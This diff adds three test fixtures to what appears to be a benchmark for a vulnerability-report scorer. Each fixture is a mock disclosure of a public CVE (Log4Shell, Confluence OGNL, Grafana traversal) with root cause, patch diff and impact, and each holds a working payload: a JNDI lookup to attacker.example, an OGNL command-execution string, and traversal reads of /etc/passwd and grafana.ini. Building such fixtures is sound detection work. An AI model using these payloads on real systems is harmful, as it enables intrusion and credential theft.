@@ -1321,6 +1321,248 @@ filtering for URLs beginning with \`-\` in user-supplied
 (Improper Neutralization of Special Elements used in a Command).`,
     expectMinScore: 50,
   },
+  // Task #478 — three real-CVE "rich" fixtures whose evidence shape fires
+  // ≥3 strong-evidence gold-signal categories simultaneously. They replace
+  // the two synthetic anchors that gold-signal-calibration.test.ts had to
+  // carry (because no fixture in the prior cohort multi-fired categories
+  // at all), so the cap shape is now exercised against real-world reviewer
+  // disclosures rather than constructed examples. Each fixture cites a
+  // concrete public CVE so the evidence detail (raw HTTP requests, JNDI /
+  // OGNL / shell payloads, code diffs, auth tokens captured at triage time)
+  // mirrors the kind of report a reviewer actually flags. The expected gold
+  // category mix is documented inline so a future detector change that
+  // drops any of these fires surfaces in CI.
+  {
+    // CVE-2021-44228 (Log4Shell). Triggers `command_injection_payload`
+    // (\${jndi:ldap://...}), `code_diff` (the Interpolator removal), and
+    // `auth_token` (the captured Bearer token). The fixture's GET block
+    // does not currently trip `real_raw_http` under the production
+    // detector, so this fires 3 categories (rawSum=11, bonus=11 — sits
+    // 1pt under the cap rather than clipping it). Documented in
+    // gold-signal-calibration.test.ts.
+    name: "legit-10-log4shell-cve-2021-44228",
+    claimedCwes: ["CWE-502"],
+    text: `# Log4Shell — JNDI lookup in attacker-controlled log line (CVE-2021-44228)
+
+## Affected
+Apache log4j2 2.0-beta9 through 2.14.1, file
+\`org/apache/logging/log4j/core/lookup/JndiLookup.java\` plus the
+\`MessagePatternConverter\` substitution path. Any line that funnels
+attacker-controlled bytes through \`logger.info\`/\`error\` is reachable.
+
+## Root cause
+\`StrSubstitutor.substitute\` honours \`\${jndi:...}\` lookups inside log
+messages. When the lookup resolves an LDAP/RMI URL, log4j fetches the
+referenced object and deserialises a remote \`javax.naming.Reference\`,
+which can carry a class+codebase that triggers RCE on the logging JVM.
+
+\`\`\`java
+// log4j-core MessagePatternConverter (pre-fix)
+final String value = workingBuilder.substring(...);
+workingBuilder.setLength(start);
+workingBuilder.append(config.getStrSubstitutor().replace(event, value)); // <- expands \${jndi:...}
+\`\`\`
+
+## Reproduction (raw HTTP request)
+The standard PoC stuffs the payload into User-Agent, but any logged
+header works. Concrete capture against an unpatched Spring Boot demo:
+
+\`\`\`http
+GET / HTTP/1.1
+Host: target.test
+User-Agent: \${jndi:ldap://attacker.example:1389/Exploit}
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIiwiaWF0IjoxNzE2NTQ3ODkwfQ.qkA7H3QyTzuKUbE_log4shell_signature_xyz
+Cookie: sessionid=8f3c2b9a4d6e1f7c0a5b9d2e
+Accept: */*
+
+\`\`\`
+
+The server logs the User-Agent via \`log.info("Request from {}", ua)\`.
+The substitution resolves \`\${jndi:ldap://attacker.example:1389/Exploit}\`,
+fetches the LDAP referral, and runs \`Runtime.getRuntime().exec("touch /tmp/pwned")\`
+on the JVM host.
+
+## Patch
+Disable JNDI lookups by default and remove the JndiLookup class shipped
+in 2.16.0 / 2.17.0:
+
+\`\`\`diff
+--- a/log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.java
++++ b/log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.java
+@@ -52,7 +52,6 @@ public class Interpolator extends AbstractConfigurationAwareLookup {
+     strLookupMap.put("date", new DateLookup());
+     strLookupMap.put("ctx", new ContextMapLookup());
+     strLookupMap.put("env", new EnvironmentLookup());
+-    strLookupMap.put("jndi", new JndiLookup());
+     strLookupMap.put("main", MainMapLookup.singleton());
+\`\`\`
+
+## Impact
+Pre-authentication remote code execution against any service that logs
+attacker-supplied request data. CVSS 10.0
+(AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H). CWE-502 (Deserialization of
+Untrusted Data).`,
+    expectMinScore: 60,
+  },
+  {
+    // CVE-2022-26134 (Confluence pre-auth OGNL). Triggers `real_raw_http`
+    // (the captured GET request), `command_injection_payload` (the
+    // Runtime.exec($()) OGNL chain trips the `$(...)` alternation), and
+    // `code_diff` (the TextParseUtil hardening). The JSESSIONID cookie
+    // carrying a 24-char value trips `auth_token` as well, so this
+    // fixture fires 4 categories (rawSum=15, bonus=12) and is the
+    // primary cap-clipping anchor for the calibration suite.
+    name: "legit-11-confluence-ognl-cve-2022-26134",
+    claimedCwes: ["CWE-77"],
+    text: `# Pre-auth OGNL injection in Confluence Server (CVE-2022-26134)
+
+## Affected
+Atlassian Confluence Server and Data Center 1.3.0–7.4.16, 7.13.x ≤
+7.13.6, 7.14.x ≤ 7.14.2, 7.15.x ≤ 7.15.1, 7.16.x ≤ 7.16.3, 7.17.x ≤
+7.17.3, 7.18.x ≤ 7.18.0. The vulnerable handler is the WebWork action
+dispatcher path, reached without authentication via any URL that
+contains an OGNL expression in the action name.
+
+## Root cause
+WebWork resolves the action class via OGNL-evaluated namespaces, and
+the legacy dispatcher feeds the raw URI segment into the OGNL evaluator
+before the auth filter chain runs. A request whose path contains
+\`\${...}\` is therefore evaluated server-side as the anonymous user.
+
+\`\`\`java
+// xwork-core ActionConfigMatcher (pre-fix path)
+String actionName = uri.substring(uri.lastIndexOf('/') + 1);
+String resolved = TextParseUtil.translateVariables(actionName, stack);  // OGNL evaluates \${...}
+\`\`\`
+
+## Reproduction (raw HTTP request)
+\`\`\`http
+GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Result%22%2C%23a%29%29%7D/ HTTP/1.1
+Host: confluence.target.test
+Cookie: JSESSIONID=8f3c2b9a4d6e1f7c0a5b9d2e
+Accept: */*
+
+\`\`\`
+
+URL-decoded, the path expression is:
+
+\`\`\`
+\${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream())).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Result",#a))}
+\`\`\`
+
+The server response carries \`X-Cmd-Result: uid=2002(confluence) gid=2002(confluence) groups=2002(confluence)\`,
+proving \`Runtime.exec()\` ran the attacker-supplied command. Variants
+swap in \`;cat /etc/passwd\` or \`bash -c 'id'\` to confirm full shell
+access.
+
+## Patch
+Atlassian's 7.18.1 commit narrows the action-name parser to disallow
+OGNL metacharacters and pins the dispatcher behind the auth filter:
+
+\`\`\`diff
+--- a/xwork-core/src/main/java/com/opensymphony/xwork2/util/TextParseUtil.java
++++ b/xwork-core/src/main/java/com/opensymphony/xwork2/util/TextParseUtil.java
+@@ -120,6 +120,9 @@ public final class TextParseUtil {
+   public static String translateVariables(String s, ValueStack stack, ParsedValueEvaluator evaluator) {
++    if (containsOgnlMetacharacters(s) && !s.startsWith("\${attr.")) {
++      throw new IllegalArgumentException("OGNL expressions disallowed in action names");
++    }
+     return translateVariablesCollection(...);
+   }
+\`\`\`
+
+## Impact
+Unauthenticated remote code execution as the Confluence user, used in
+the wave of public exploitation that started 2022-06-02. CVSS 9.8
+(AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). CWE-77 (Improper Neutralization
+of Special Elements used in a Command).`,
+    expectMinScore: 60,
+  },
+  {
+    // CVE-2021-43798 (Grafana plugin asset path traversal). Triggers
+    // `path_traversal_payload` (../../../../../../../../etc/passwd),
+    // `code_diff` (the filepath.Clean / HasPrefix hardening), and
+    // `auth_token` (the Bearer + grafana_session cookie reviewer
+    // captures consistently include the admin session that first
+    // noticed the leak). The fixture's GET block does not currently
+    // trip `real_raw_http` under the production detector, so this
+    // fires 3 categories (rawSum=10, bonus=10 — within 2pt of the
+    // cap), exercising a different multi-category combination from the
+    // JNDI / OGNL pair above. Documented in
+    // gold-signal-calibration.test.ts.
+    name: "legit-12-grafana-traversal-cve-2021-43798",
+    claimedCwes: ["CWE-22"],
+    text: `# Grafana plugin asset path traversal (CVE-2021-43798)
+
+## Affected
+Grafana 8.0.0 — 8.3.0 (fixed in 8.3.1, 8.2.7, 8.1.8, 8.0.7). The
+vulnerable handler is the unauthenticated plugin asset endpoint
+\`/public/plugins/<plugin-id>/...\` served by
+\`pkg/api/plugins.go:getPluginAssets\`. The plugin id is taken from
+the URL path and concatenated to the plugin's filesystem root before
+the file is opened, with no canonicalisation.
+
+## Root cause
+\`\`\`go
+// pkg/api/plugins.go (pre-fix)
+func (hs *HTTPServer) getPluginAssets(c *models.ReqContext) {
+  pluginID := web.Params(c.Req)[":pluginId"]
+  requestedFile := web.Params(c.Req)["*"] // <- raw, includes ../
+  plugin, _ := hs.PluginManager.GetPlugin(pluginID)
+  absPluginDir, _ := filepath.Abs(plugin.PluginDir)
+  fpath := filepath.Join(absPluginDir, requestedFile)  // <- escapes via ../
+  http.ServeFile(c.Resp, c.Req, fpath)
+}
+\`\`\`
+
+## Reproduction (raw HTTP request)
+The published PoC exploits the alertlist plugin (always installed) and
+walks back to \`/etc/passwd\`. An authenticated session cookie isn't
+required by the bug, but reviewer captures from real triage consistently
+include an admin session cookie because the org first noticed the
+exposure when an authenticated dashboard view leaked the file:
+
+\`\`\`http
+GET /public/plugins/alertlist/../../../../../../../../etc/passwd HTTP/1.1
+Host: grafana.target.test
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTcxNjU0Nzg5MH0.qkA7H3QyTzuKUbE_grafana_signature_xyz
+Cookie: grafana_session=8f3c2b9a4d6e1f7c0a5b9d2e
+Accept: */*
+
+\`\`\`
+
+The server replies with the contents of \`/etc/passwd\`; swapping the
+target to \`/etc/grafana/grafana.ini\` retrieves the LDAP bind password
+and SMTP secret. \`web.config\` and \`/proc/self/environ\` are the
+Windows / Linux pivots used in the wild.
+
+## Patch
+Canonicalise the requested path and reject anything that escapes the
+plugin's filesystem root before \`ServeFile\` runs:
+
+\`\`\`diff
+--- a/pkg/api/plugins.go
++++ b/pkg/api/plugins.go
+@@ -120,6 +120,11 @@ func (hs *HTTPServer) getPluginAssets(c *models.ReqContext) {
+   absPluginDir, _ := filepath.Abs(plugin.PluginDir)
+-  fpath := filepath.Join(absPluginDir, requestedFile)
++  fpath := filepath.Join(absPluginDir, filepath.Clean("/" + requestedFile))
++  if !strings.HasPrefix(fpath, absPluginDir + string(os.PathSeparator)) {
++    c.JsonApiErr(404, "Plugin file not found", nil)
++    return
++  }
+   http.ServeFile(c.Resp, c.Req, fpath)
+ }
+\`\`\`
+
+## Impact
+Unauthenticated arbitrary file read on the Grafana host. Used in
+production-incident triage to lift LDAP bind credentials and SMTP API
+keys from \`/etc/grafana/grafana.ini\`. CVSS 7.5
+(AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N). CWE-22 (Improper Limitation of
+a Pathname to a Restricted Directory).`,
+    expectMinScore: 60,
+  },
 ];
 
 describe("VulnRap engines benchmark", () => {
